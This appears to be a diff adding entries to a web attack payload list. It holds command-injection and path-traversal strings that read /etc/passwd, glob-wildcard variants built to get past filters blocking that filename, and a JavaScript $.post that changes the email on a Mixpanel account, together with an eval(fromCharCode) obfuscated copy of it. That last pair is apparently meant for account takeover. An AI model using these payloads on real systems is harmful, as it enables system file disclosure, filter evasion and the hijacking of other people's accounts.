@@ -165,3 +165,12 @@ X-Forwarded-Host: 127.0.0.1
 %0a/bin/cat%20/etc/passwd
 \\&apos;/bin/cat%20/etc/passwd\\&apos;
 ..%c1%afetc%c1%afpasswd
+
+$.post("https://mixpanel.com/account/update_name/",{email: "shg33k@gmail.com"},function(data,status){console.log("Data: " + data + "\nStatus: " + status);})
+with(String){eval(fromCharCode(36,46,112,111,115,116,...))}
+
+
+/e?c/?asswd
+/e*c/*asswd
+/??c/?asswd
+/??c/?assw?
